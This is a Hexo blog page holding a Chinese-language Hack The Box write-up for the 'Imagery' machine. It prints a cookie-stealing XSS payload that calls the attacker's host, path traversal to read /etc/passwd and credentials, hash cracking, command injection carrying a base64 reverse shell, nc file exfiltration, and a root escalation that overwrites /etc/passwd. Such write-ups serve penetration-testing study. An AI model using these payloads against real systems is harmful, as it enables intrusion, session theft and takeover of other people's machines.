@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"dawoxiansigema.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="A detailed walkthrough of exploiting a Hack The Box machine through multiple attack vectors. The process involves initial reconnaissance with nmap, bypassing client-side restrictions, exploiting blind">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Imagery">
+<meta property="og:url" content="http://dawoxiansigema.github.io/2025/12/23/Imagery/index.html">
+<meta property="og:site_name" content="Eur3ka&#39;s Studio">
+<meta property="og:description" content="A detailed walkthrough of exploiting a Hack The Box machine through multiple attack vectors. The process involves initial reconnaissance with nmap, bypassing client-side restrictions, exploiting blind">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://dawoxiansigema.github.io/2025/12/23/Imagery/1.png">
+<meta property="og:image" content="http://dawoxiansigema.github.io/2025/12/23/Imagery/2.png">
+<meta property="og:image" content="http://dawoxiansigema.github.io/2025/12/23/Imagery/3.png">
+<meta property="og:image" content="http://dawoxiansigema.github.io/2025/12/23/Imagery/4.png">
+<meta property="article:published_time" content="2025-12-23T08:01:19.000Z">
+<meta property="article:modified_time" content="2025-12-24T03:17:31.434Z">
+<meta property="article:author" content="Xu Haoxiang">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://dawoxiansigema.github.io/2025/12/23/Imagery/1.png">
+
+
+<link rel="canonical" href="http://dawoxiansigema.github.io/2025/12/23/Imagery/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://dawoxiansigema.github.io/2025/12/23/Imagery/","path":"2025/12/23/Imagery/","title":"Imagery"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Imagery | Eur3ka's Studio</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Eur3ka's Studio</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-docs"><a href="/docs/" rel="section"><i class="fa fa-book fa-fw"></i>Docs</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Recon"><span class="nav-number">1.</span> <span class="nav-text">Recon</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Nmap"><span class="nav-number">1.1.</span> <span class="nav-text">Nmap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS"><span class="nav-number">1.2.</span> <span class="nav-text">XSS</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-web"><span class="nav-number">2.</span> <span class="nav-text">Shell as web</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-mark"><span class="nav-number">3.</span> <span class="nav-text">Shell as mark</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-root"><span class="nav-number">4.</span> <span class="nav-text">Shell as root</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Xu Haoxiang"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Xu Haoxiang</p>
+  <div class="site-description" itemprop="description">Never again.</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://dawoxiansigema.github.io/2025/12/23/Imagery/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Xu Haoxiang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Eur3ka's Studio">
+      <meta itemprop="description" content="Never again.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Imagery | Eur3ka's Studio">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Imagery
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-12-23 16:01:19" itemprop="dateCreated datePublished" datetime="2025-12-23T16:01:19+08:00">2025-12-23</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-12-24 11:17:31" itemprop="dateModified" datetime="2025-12-24T11:17:31+08:00">2025-12-24</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Linux-Penetration-in-HTB/" itemprop="url" rel="index"><span itemprop="name">Linux Penetration in HTB</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>A detailed walkthrough of exploiting a Hack The Box machine through multiple attack vectors. The process involves initial reconnaissance with nmap, bypassing client-side restrictions, exploiting blind XSS to steal admin cookies, leveraging LFI vulnerabilities to extract credentials, achieving RCE through visual transform functionality, cracking encrypted backup files with a custom Python script, and escalating privileges from web user to mark and finally to root using a custom binary for cron job manipulation.</p>
+<span id="more"></span>
+
+<h1 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>对靶机的端口嗅探结果如下 开启的8000端口为http服务 剩下的单一个22端口</p>
+<pre><code>❯ sudo nmap -sCV 10.10.11.88
+Password:
+Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-23 15:32 +0800
+Nmap scan report for 10.10.11.88 (10.10.11.88)
+Host is up (0.57s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
+|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
+8000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.7)
+|_http-title: Image Gallery
+|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<p><img src="/2025/12/23/Imagery/1.png"></p>
+<p>8000端口进去后发现有注册登录页面 我一般拿到注册登录不会第一时间开始注(懒) 于是先注册一个号然后登录</p>
+<pre><code>┌──(kali㉿kali)-[~/Desktop]
+└─$ whatweb -v http://10.10.11.88:8000
+WhatWeb report for http://10.10.11.88:8000
+Status    : 200 OK
+Title     : Image Gallery
+IP        : 10.10.11.88
+Country   : RESERVED, ZZ
+
+Summary   : Email[support@imagery.com], HTML5, HTTPServer[Werkzeug/3.1.3 Python/3.12.7], Python[3.12.7], Script, Werkzeug[3.1.3] 
+</code></pre>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>对网页大概框架嗅探完 google后也没有发现比较好的洞 最终经过高人指点 在report_bug处发现了可以XSS</p>
+<pre><code>HTTP/1.1 200 OK
+Server: Werkzeug/3.1.3 Python/3.12.7
+Date: Tue, 23 Dec 2025 08:11:36 GMT
+Content-Type: application/json
+Content-Length: 78
+Vary: Cookie
+Connection: close
+
+&#123;&quot;message&quot;:&quot;Bug report submitted. Admin review in progress. &quot;,&quot;success&quot;:true&#125;
+</code></pre>
+<p>因为这个页面会与admin有交互 说不定可以偷cookie 于是在本地建立80端口并构造一下XSS</p>
+<pre><code>❯ python3 -m http.server 80
+Serving HTTP on :: port 80 (http://[::]:80/) ...
+
+&#123;&quot;bugName&quot;:&quot;summary&quot;,&quot;bugDetails&quot;:
+&quot;&lt;img src=x onerror=\&quot;location.href=&#39;http://10.10.16.16/hack?cookie=&#39;+ document.cookie\&quot;&gt;&quot;&#125;
+</code></pre>
+<p>不过我有问题 我怎么知道admin接到的report后台长啥样 我怎么知道admin会不会点击 我怎么知道admin会不会只看summary</p>
+<p><img src="/2025/12/23/Imagery/2.png"></p>
+<p>开上帝视角看一下 我们构造的XSS是一个error的图片 实际上到后台也确实裂开了 理论上不点击是不会触发XSS的 于是出题人设置了过几秒钟自动点击并查看该report(你说的都对 但是我做题时该怎么想得到呢)</p>
+<p><img src="/2025/12/23/Imagery/3.png"></p>
+<p>那么此时在我们的python后端就可以接到cookie了</p>
+<pre><code>::ffff:10.10.11.88 - - [23/Dec/2025 16:18:07] &quot;GET /hack?cookie=session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aUpQQA.M8tW3-6P28Xwdot3oVjUTwr5hBs HTTP/1.1&quot; 404 -
+</code></pre>
+<p>然后在burp里面设置cookies替换 使用burp自带的浏览器 即可关闭interception 实现admin登录了</p>
+<p><img src="/2025/12/23/Imagery/4.png"></p>
+<p>接着在Admin Panel发现文件下载接口 发现可以自定义路径以用于下载任意文件</p>
+<pre><code>GET /admin/get_system_log?log_identifier=../../../../etc/passwd HTTP/1.1
+...
+HTTP/1.1 200 OK
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</code></pre>
+<p>于是乎在google了一下werkzeug的项目路径后 尝试获取conf.py 好在该配置文件就在项目根目录可以直接..&#x2F;</p>
+<pre><code>DATA_STORE_PATH = &#39;db.json&#39;
+UPLOAD_FOLDER = &#39;uploads&#39;
+SYSTEM_LOG_FOLDER = &#39;system_logs&#39;
+</code></pre>
+<p>如法炮制读取db.json 总能获取一些有用的信息</p>
+<pre><code>&quot;users&quot;: [
+        &#123;
+            &quot;username&quot;: &quot;admin@imagery.htb&quot;,
+            &quot;password&quot;: &quot;5d9c1d507a3f76af1e5c97a3ad1eaa31&quot;,
+            &quot;isAdmin&quot;: true,
+            &quot;displayId&quot;: &quot;a1b2c3d4&quot;,
+            &quot;login_attempts&quot;: 0,
+            &quot;isTestuser&quot;: false,
+            &quot;failed_login_attempts&quot;: 0,
+            &quot;locked_until&quot;: null
+        &#125;,
+        &#123;
+            &quot;username&quot;: &quot;testuser@imagery.htb&quot;,
+            &quot;password&quot;: &quot;2c65c8d7bfbca32a3ed42596192384f6&quot;,
+            &quot;isAdmin&quot;: false,
+            &quot;displayId&quot;: &quot;e5f6g7h8&quot;,
+            &quot;login_attempts&quot;: 0,
+            &quot;isTestuser&quot;: true,
+            &quot;failed_login_attempts&quot;: 0,
+            &quot;locked_until&quot;: null
+        &#125;
+    ],
+</code></pre>
+<p>使用hashcat破解testuser的密码 admin的解不开</p>
+<pre><code>❯ hashcat -m 0 2c65c8d7bfbca32a3ed42596192384f6 ~/Documents/Red/SecDictionary/PasswordDic/弱口令字典/rockyou-top15000.txt
+2c65c8d7bfbca32a3ed42596192384f6:iambatman
+</code></pre>
+<h1 id="Shell-as-web"><a href="#Shell-as-web" class="headerlink" title="Shell as web"></a>Shell as web</h1><p>发现没办法直接登录ssh 查看sshd_config发现不允许密码登录</p>
+<pre><code># To disable tunneled clear text passwords, change to no here!
+PasswordAuthentication no
+#PermitEmptyPasswords no
+</code></pre>
+<p>很难受 那只能从里面弹shell出来了 但是现有的读取文件接口肯定做不到写文件和弹shell 那只能从业务函数入手</p>
+<pre><code>unique_output_filename = f&quot;transformed_&#123;uuid.uuid4()&#125;.&#123;original_ext&#125;&quot;
+        output_filename_in_db = os.path.join(&#39;admin&#39;, &#39;transformed&#39;, unique_output_filename)
+        output_filepath = os.path.join(UPLOAD_FOLDER, output_filename_in_db)
+        if transform_type == &#39;crop&#39;:
+            x = str(params.get(&#39;x&#39;))
+            y = str(params.get(&#39;y&#39;))
+            width = str(params.get(&#39;width&#39;))
+            height = str(params.get(&#39;height&#39;))
+            command = f&quot;&#123;IMAGEMAGICK_CONVERT_PATH&#125; &#123;original_filepath&#125; -crop &#123;width&#125;x&#123;height&#125;+&#123;x&#125;+&#123;y&#125; &#123;output_filepath&#125;&quot;
+            subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
+</code></pre>
+<p>从启动器app.py中发现了一些自定义的python类 在其中的api_edit.py发现一个可控函数 subprocess用于linux执行cmd 而x和y都是我们可控的 那么先正常上传图片 获得图片id 然后再控制y参数 使其反弹个shell出来</p>
+<pre><code>&#123;&quot;imageId&quot;:&quot;5be6f990-1c95-48f6-a103-f6c83ffe5513&quot;,&quot;message&quot;:&quot;Image uploaded successfully!&quot;,&quot;success&quot;:true&#125;
+
+&#123;
+	&quot;imageId&quot;:&quot;5be6f990-1c95-48f6-a103-f6c83ffe5513&quot;,
+	&quot;transformType&quot;:&quot;crop&quot;,
+	&quot;params&quot;:&#123;
+		&quot;x&quot;:0,
+	    &quot;y&quot;:&quot;0;printf YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNi80NDQ0IDA+JjE=|base64 -d|bash;&quot;,
+		&quot;width&quot;:3024,
+		&quot;height&quot;:1744
+	&#125;
+&#125;
+
+❯ nc -lvn 4444
+bash: cannot set terminal process group (1296): Inappropriate ioctl for device
+bash: no job control in this shell
+web@Imagery:~/web$
+</code></pre>
+<p>至此成功连接上web用户</p>
+<h1 id="Shell-as-mark"><a href="#Shell-as-mark" class="headerlink" title="Shell as mark"></a>Shell as mark</h1><p>又一次经过高人指点 找到了<code>/var/backup</code>目录下的备份文件 使用nc传过来并分析</p>
+<pre><code>web@Imagery:/var/backup$ nc -q 0 10.10.16.16 5555 &lt; web_20250806_120723.zip.aes
+❯ nc -lvn 5555 &gt; backup.zip.aes
+❯ file backup.zip.aes
+backup.zip.aes: AES encrypted data, version 2, created by &quot;pyAesCrypt 6.1.1&quot;
+</code></pre>
+<p>发现是个什么<code>pyAesCrypt</code>加密的鬼 上网搜能解开但是好像得自己写脚本 那我果断交给豆包</p>
+<pre><code>import pyAesCrypt
+import os
+import sys
+
+def crack_pyaescrypt(encrypted_file, dict_file):
+    # 基础文件检查
+    if not os.path.exists(encrypted_file) or not os.path.exists(dict_file):
+        print(&quot;文件不存在！&quot;)
+        return
+    
+    # 读取密码字典（每行一个密码）
+    with open(dict_file, &#39;r&#39;, encoding=&#39;utf-8&#39;, errors=&#39;ignore&#39;) as f:
+        passwords = [p.strip() for p in f if p.strip()]
+    
+    print(f&quot;开始尝试 &#123;len(passwords)&#125; 个密码...&quot;)
+    buffer_size = 64 * 1024  # 默认缓冲区大小，和加密一致即可
+    
+    # 遍历密码解密
+    for pwd in passwords:
+        try:
+            # 解密到临时文件
+            dec_file = encrypted_file + &quot;_decrypted&quot;
+            pyAesCrypt.decryptFile(encrypted_file, dec_file, pwd, buffer_size)
+            # 解密成功（没报错就是密码对了）
+            print(f&quot;\n✅ 破解成功！密码：&#123;pwd&#125;&quot;)
+            print(f&quot;解密文件：&#123;dec_file&#125;&quot;)
+            return
+        except:
+            # 所有错误都视为密码错（简化逻辑）
+            print(f&quot;❌ 密码错误：&#123;pwd&#125;&quot;, end=&#39;\r&#39;)
+    
+    print(&quot;\n❌ 字典中无正确密码&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    # 命令行传参：脚本名 加密文件 密码字典
+    if len(sys.argv) != 3:
+        print(&quot;用法：python crack.py 加密文件路径 密码字典路径&quot;)
+        print(&quot;示例：python crack.py test.aes pass.txt&quot;)
+        sys.exit(1)
+    
+    crack_pyaescrypt(sys.argv[1], sys.argv[2])
+</code></pre>
+<p>最终也是成功解开 解开后解压文件、查看db.json、hashcat用户mark的md5密码哈希 </p>
+<pre><code>❯ python crack.py backup.zip.aes /Users/joe/Documents/Red/SecDictionary/PasswordDic/弱口令字典/rockyou-top15000.txt
+开始尝试 15004 个密码...
+❌ 密码错误：starwarspr0ho
+✅ 破解成功！密码：bestfriends
+解密文件：backup.zip.aes_decrypted
+
+01c3d2e5bdaf6134cec0a367cf53e535:supersmash
+</code></pre>
+<p>最终在web用户下切换至mark 拿到user.txt</p>
+<pre><code>web@Imagery:~/web$ su mark
+su mark
+Password: supersmash
+id
+uid=1002(mark) gid=1002(mark) groups=1002(mark)
+python3 -c &#39;import os,pty;pty.spawn(&quot;bash&quot;)&#39;
+
+mark@Imagery:/home/web/web$ cd ~
+cd ~
+mark@Imagery:~$ cat user.txt
+cat user.txt
+b6023dc31b7bbc1eafe5dd41274851af
+</code></pre>
+<h1 id="Shell-as-root"><a href="#Shell-as-root" class="headerlink" title="Shell as root"></a>Shell as root</h1><p>先例行<code>sudo -l</code>一下</p>
+<pre><code>mark@Imagery:~$ sudo -l
+sudo -l
+Matching Defaults entries for mark on Imagery:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User mark may run the following commands on Imagery:
+    (ALL) NOPASSWD: /usr/local/bin/charcol
+</code></pre>
+<p>发现这个charcol是备份用的 可以附加<code>-R</code>参数重置密码 重置后使用<code>shell</code>参数进入命令行模式</p>
+<pre><code>mark@Imagery:~$ sudo /usr/local/bin/charcol shell
+sudo /usr/local/bin/charcol shell
+
+  ░██████  ░██                                                  ░██
+ ░██   ░░██ ░██                                                  ░██
+░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██
+░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██
+░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██
+ ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██
+  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██
+
+
+
+Charcol The Backup Suit - Development edition 1.0.0
+</code></pre>
+<p>再经过高人指点 <code>fetch</code>可以从外部地址下载文件 那么毕竟是root状态 可以下载个去掉root用户x属性的passwd并替换</p>
+<pre><code>[2025-12-24 03:07:29] [INFO] Entering Charcol interactive shell. Type &#39;help&#39; for commands, &#39;exit&#39; to quit.
+charcol&gt; fetch http://10.10.16.16:8080/passwd -o /etc/passwd -f
+fetch http://10.10.16.16:8080/passwd -o /etc/passwd -f
+
+mark@Imagery:~$ su root
+su root
+root@Imagery:/home/mark# cat /root/root.txt
+cat /root/root.txt
+61d0b2776a4148c4cd3b4488b2b1450f
+</code></pre>
+<p>还能这样</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/11/28/Mssql%E6%B8%97%E9%80%8F%E6%9E%9A%E4%B8%BE/" rel="prev" title="Mssql渗透枚举">
+                  <i class="fa fa-angle-left"></i> Mssql渗透枚举
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Xu Haoxiang</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
